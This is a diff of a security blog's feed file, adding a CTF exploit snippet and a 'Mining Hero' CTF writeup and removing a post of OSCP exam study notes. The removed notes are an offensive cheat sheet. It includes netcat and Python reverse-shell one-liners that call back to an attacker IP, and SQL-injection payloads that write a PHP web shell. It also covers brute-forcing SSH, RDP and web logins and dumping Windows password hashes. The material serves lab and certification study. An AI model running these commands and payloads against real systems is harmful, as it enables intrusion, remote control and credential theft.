+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nops&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Trigger the buffer overflow
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This exploit should work even when ASLR is turned on.&lt;/p&gt;
+
+&lt;section class=&quot;related&quot;&gt;
+  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
+  &lt;ul class=&quot;post-list&quot;&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
+          Mining Hero Vulnerabilities
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
+          Simple Heap Buffer Overflow
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
+          Return Oriented Programming Tutorial
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+  &lt;/ul&gt;
+&lt;/section&gt;</content><author><name></name></author><summary type="html">Address Space Layout Randomization (ASLR) is a modern exploit mitigation technique that Operating Systems typically use to randomize addresses when a process is executed. This is implemented by having the OS change the locations of special areas, such as the base of executable, the heap, the stack, and any libraries that are loaded in memory. Since memory addresses are unpredictable when ASLR is turned on, hardcoded addresses can no longer be used in exploits when ASLR is enabled.</summary></entry><entry><title type="html">Mining Hero Vulnerabilities</title><link href="http://localhost:4000/2020/10/25/mining-hero-vulnerabilities.html" rel="alternate" type="text/html" title="Mining Hero Vulnerabilities" /><published>2020-10-25T00:00:00-04:00</published><updated>2020-10-25T00:00:00-04:00</updated><id>http://localhost:4000/2020/10/25/mining-hero-vulnerabilities</id><content type="html" xml:base="http://localhost:4000/2020/10/25/mining-hero-vulnerabilities.html">&lt;p&gt;&lt;a href=&quot;../../../assets/other/2020-10-25-mining-hero-vulnerabilities/text-game.cpp&quot;&gt;Mining Hero&lt;/a&gt; (click &lt;a href=&quot;../../../assets/other/2020-10-25-mining-hero-vulnerabilities/text-game&quot;&gt;here&lt;/a&gt; for the binary) is a CTF problem I solved when I played in MetaCTF over this weekend. It involves chaining an integer overflow vulnerability with a format string vulnerability in order to obtain the flag. This is my writeup for how I exploited the binary.&lt;/p&gt;
 
 &lt;p&gt;When I compiled the binary, &lt;code class=&quot;highlighter-rouge&quot;&gt;g++&lt;/code&gt; immediately told me that there was a format string vulnerability in the code. This information will become useful later.&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;g++ &lt;span class=&quot;nt&quot;&gt;-fno-stack-protector&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Wall&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; text-game text-game.cpp
@@ -408,6 +668,12 @@ Please enter a number 1-4 to continue...
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
+          Defeating ASLR via Memory Leak
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
           Simple Heap Buffer Overflow
         &lt;/a&gt;
@@ -416,12 +682,6 @@ Please enter a number 1-4 to continue...
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
-          Pentesting GreenOptic: 1
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -618,6 +878,12 @@ flag{insert_flag_here}
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
+          Defeating ASLR via Memory Leak
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
           Mining Hero Vulnerabilities
         &lt;/a&gt;
@@ -626,12 +892,6 @@ flag{insert_flag_here}
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
           Return Oriented Programming Tutorial
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
-          Pentesting GreenOptic: 1
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -968,6 +1228,12 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
+          Defeating ASLR via Memory Leak
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
           Mining Hero Vulnerabilities
         &lt;/a&gt;
@@ -976,12 +1242,6 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
           Simple Heap Buffer Overflow
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/07/21/pentesting-greenoptic-1.html&quot;&gt;
-          Pentesting GreenOptic: 1
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1132,6 +1392,12 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
+          Defeating ASLR via Memory Leak
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
           Mining Hero Vulnerabilities
         &lt;/a&gt;
@@ -1140,12 +1406,6 @@ ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
           Simple Heap Buffer Overflow
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
-          Return Oriented Programming Tutorial
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1506,6 +1766,12 @@ void ReadMemory(char *addr_hex, int n) {
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
+          Defeating ASLR via Memory Leak
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
           Mining Hero Vulnerabilities
         &lt;/a&gt;
@@ -1514,12 +1780,6 @@ void ReadMemory(char *addr_hex, int n) {
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
           Simple Heap Buffer Overflow
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
-          Return Oriented Programming Tutorial
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1714,6 +1974,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
+          Defeating ASLR via Memory Leak
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
           Mining Hero Vulnerabilities
         &lt;/a&gt;
@@ -1722,12 +1988,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
           Simple Heap Buffer Overflow
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
-          Return Oriented Programming Tutorial
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1773,6 +2033,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
+          Defeating ASLR via Memory Leak
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
           Mining Hero Vulnerabilities
         &lt;/a&gt;
@@ -1781,12 +2047,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
           Simple Heap Buffer Overflow
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
-          Return Oriented Programming Tutorial
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1816,6 +2076,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
+          Defeating ASLR via Memory Leak
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
           Mining Hero Vulnerabilities
         &lt;/a&gt;
@@ -1824,12 +2090,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
           Simple Heap Buffer Overflow
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
-          Return Oriented Programming Tutorial
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1883,537 +2143,10 @@ c7(): rax = 0x22
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
-          Mining Hero Vulnerabilities
+        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
+          Defeating ASLR via Memory Leak
         &lt;/a&gt;
       &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
-          Simple Heap Buffer Overflow
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
-          Return Oriented Programming Tutorial
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-  &lt;/ul&gt;
-&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be going over how I cracked this crackme. When I first executed the program, it started off by asking me to enter some password, so it is clear that our goal here is to figure out what this password is.</summary></entry><entry><title type="html">Useful OSCP Notes</title><link href="http://localhost:4000/2020/02/06/useful-oscp-notes.html" rel="alternate" type="text/html" title="Useful OSCP Notes" /><published>2020-02-06T00:00:00-05:00</published><updated>2020-02-06T00:00:00-05:00</updated><id>http://localhost:4000/2020/02/06/useful-oscp-notes</id><content type="html" xml:base="http://localhost:4000/2020/02/06/useful-oscp-notes.html">&lt;p&gt;I have been studying for the OSCP for a little less than two months. I was studying 5-7 hours per day during my winter break, and I’ve learned a lot since I began. At the time of writing this blog post, my exam is in a week, and I just wanted to put down some of my notes that I’ve been using into a blog post. These notes mainly contain commands that I have been using throughout the PWK labs.&lt;/p&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;p&gt;Ping Scan:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sn [IP addresses]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Search for specific port:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p [port] [IP addresses]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;OS Fingerprinting:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -O [IP address]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Banner Grabbing:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT [IP addresses]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Connect to SMB and determine OS:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap [IP address] --script smb-os-discovery.nse&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;DNS Zone Transfer:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap --script=dns-zone-transfer -p 53 [target]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;FTP Bounce Scan:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p- -b anonymous@[FTP Server] [target] -Pn&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;List of NSE scripts that could be used for vulnerability scanning:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;ls -l /usr/share/nmap/scripts/*vuln*&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;www.stationx.net/nmap-cheat-sheet/&quot;&gt;Link to a more in-depth Nmap quide&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;dns&quot;&gt;DNS&lt;/h3&gt;
-&lt;p&gt;Finding name servers:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;host -t ns example.com&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Finding mail servers:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;host -t mx example.com&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Looking up an IP address:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;host example.com&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Brute force IP addresses given a list of possible names:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;for ip in $(cat list.txt); do host $ip.example.com;done | grep -v &quot;not found&quot;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Brute force domain names given list of possible IP addresses:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;for ip in $(seq 155 190);do host xxx.xxx.xxx.$ip;done | grep -v &quot;not found&quot;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Zone Transfer:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;host -l example.com [name server]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Script that automatically checks each DNS server and does a zone transfer:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Simple Zone Transfer Bash Script 
-#!/bin/bash 
-# $1 is the first argument given after the bash script 
-# Check if argument was given, if not, print usage 
-if [ -z &quot;$1&quot; ]; then 
-echo &quot;[*] Simple Zone transfer script&quot; 
-echo &quot;[*] Usage 
-: $0 &amp;lt;domain name&amp;gt; &quot; 
-exit 0 
-fi 
-# if argument was given, identify the DNS servers for the domain 
-for server in $(host -t ns $1 |cut -d&quot; &quot; -f4);do 
-# For each of these servers, attempt a zone transfer 
-host -l $1 $server |grep &quot;has address&quot; 
-done 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;smb&quot;&gt;SMB&lt;/h3&gt;
-&lt;p&gt;General enumeration:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;enum4linux -a [IP]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Scan for open shares:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;nbtscan -r [IP]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;OS discovery:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -v -p 139, 445 --script=smb-os-discovery [IP]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;SMB vuln scan:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -v -p 139,445 --script=smb-vuln* --script-args=unsafe=1 &lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Finding version of SMB: Use &lt;a href=&quot;https://raw.githubusercontent.com/rewardone/OSCPRepo/master/scripts/recon_enum/smbver.sh&quot;&gt;this script&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;SMBMap:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -H [IP]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;View share names:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient -L [IP] -N&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Connecting to an SMB share:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient \\\\[IP]\\[share name]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Mount shares:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;mount -t cifs //[IP]/[share name] [folder to mount to] -o username=[username],vers=1.0&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Common exploits: &lt;a href=&quot;https://www.exploit-db.com/exploits/40279&quot;&gt;MS08-067&lt;/a&gt; and &lt;a href=&quot;https://github.com/worawit/MS17-010&quot;&gt;MS17-010&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
-
-&lt;p&gt;Brute force directories:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster -u [URL] -w /usr/share/wordlists/dirb/common.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Scanning for possible vulns:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;nikto --host [IP address]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Scanning for vulns in Wordpress:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;wpscan --url [URL]&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;reverse-shells&quot;&gt;Reverse Shells&lt;/h3&gt;
-&lt;p&gt;Netcat reverse shell (target): &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nv [your IP] [port] -e cmd.exe&lt;/code&gt;. Replace cmd.exe with /bin/sh if the target is on linux.&lt;/p&gt;
-
-&lt;p&gt;Netcat reverse shell listener (local): &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nlvp 4444&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Python reverse shell: Make a local reverse shell listener, then run &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/code&gt; on the target (change the IP and port in the code).&lt;/p&gt;
-
-&lt;p&gt;Amazing PHP reverse shell that I use all the time: &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;pentestmonkey&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;A list of other handy reverse shells: &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;pentestmonkey&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h3&gt;
-&lt;p&gt;Useful guides: &lt;a href=&quot;http://securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html&quot;&gt;Security Idiots&lt;/a&gt; and &lt;a href=&quot;http://pentestmonkey.net/category/cheat-sheet/sql-injection&quot;&gt;pentestmonkey&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Find the number of columns: Use the &lt;code class=&quot;highlighter-rouge&quot;&gt;order by [count]&lt;/code&gt; instruction in your SQL injection. Start with 1, and then gradually increment count until you get an error.&lt;/p&gt;
-
-&lt;p&gt;Adding your own select statement: Type in a normal query value and then type in &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,5,6&lt;/code&gt;. Note that both statements must have the same number of columns.&lt;/p&gt;
-
-&lt;p&gt;Discover MySQL version: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,@@version,6&lt;/code&gt;. Obviously, you’ll have to modify this to use the correct number of columns.&lt;/p&gt;
-
-&lt;p&gt;Discover the current user: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,user(),6&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Getting a list of tables: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,table_name,6 FROM information_schema.tables&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Getting the names of columns of a table: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,column_name,6 from information_schema.columns where table_name='users'&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Concatenate strings from two columns in to a single column: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,concat(column1,0x3a,column2) from table_name&lt;/code&gt;. Replace column1, column2, and table_name with the correct values.&lt;/p&gt;
-
-&lt;p&gt;Limit the number of rows returned: &lt;code class=&quot;highlighter-rouge&quot;&gt;LIMIT [rows]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Reading local files in MySQL: &lt;code class=&quot;highlighter-rouge&quot;&gt;union all select 1,2,3,4,load_file('file/path'),6&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Writing local files: &lt;code class=&quot;highlighter-rouge&quot;&gt;'union all select 1,2,3,4,&quot;&amp;lt;?php echo shell_exec($_GET['cmd']);?&amp;gt;&quot;,6 into OUTFILE 'backdoor.php'&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;MS-SQL instant root: Sometimes you can instantly root the machine if you have DB credentials for MSSQL. &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 443 -Pn -sS --script ms-sql-xp-cmdshell.nse --script-args mssql.username=sa,mssql.password=password,mssql.instance-all,ms-sql-xp-cmdshell.cmd=&quot;whoami&quot; [IP]&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;lfirfi&quot;&gt;LFI/RFI&lt;/h3&gt;
-&lt;p&gt;Suppose you have the ability to include any local php file on the target, and also suppose that you could write any php script to the target. You could write the following PHP code: &lt;code class=&quot;highlighter-rouge&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt; to obtain code execution via the cmd parameter.&lt;/p&gt;
-
-&lt;p&gt;For RFIs, you can just set the PHP include parameter to be a file on your local web server that gives you code execution.&lt;/p&gt;
-
-&lt;p&gt;For more information on LFI/RFI vulns, &lt;a href=&quot;https://hackersonlineclub.com/lfi-rfi/&quot;&gt;click here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;password-attacks&quot;&gt;Password Attacks&lt;/h3&gt;
-&lt;p&gt;List of default credentials: &lt;a href=&quot;http://open-sez.me/&quot;&gt;Open-sez.me&lt;/a&gt; and &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv&quot;&gt;Default-passwords&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Wordlists: Kali has wordlists located under /usr/share/wordlists/. There is also a common usernames file under /usr/share/commix/src/txt/usernames.txt&lt;/p&gt;
-
-&lt;p&gt;Generate all possible combinations of a list of characters: &lt;code class=&quot;highlighter-rouge&quot;&gt;crunch [min] [max] [list of characters] -o [output file]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Generate password lists using words from a website: &lt;code class=&quot;highlighter-rouge&quot;&gt;cewl [URL]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Brute force websites using Medusa: &lt;code class=&quot;highlighter-rouge&quot;&gt;medusa -h [IP] -U [usernames file] -P [passwords file]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Wordpress brute force: &lt;code class=&quot;highlighter-rouge&quot;&gt;wpscan --log --batch --url [IP address] --wordlist /usr/share/wordlists/rockyou.txt --username [username] --threads 20&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Brute force web logins: &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra -l [user] -p [password] [IP] http-post-form &quot;&amp;lt;Login Page&amp;gt;:&amp;lt;Request Body&amp;gt;:&amp;lt;Error message&amp;gt;&quot;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Brute force RDP: &lt;code class=&quot;highlighter-rouge&quot;&gt;ncrack -vv --user [user] -P [passwords file] rdp://[IP]&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Brute force SNMP: &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra -P [passwords file] -v [IP] snmp&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Brute force SSH: &lt;code class=&quot;highlighter-rouge&quot;&gt;hydra -l root -P [passwords file] [IP] ssh&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Dumping windows password hashes: Send over /usr/share/windows-binaries/fgdump.exe over to the target, and then run fgdump.exe. It will output files in a pwdump file.&lt;/p&gt;
-
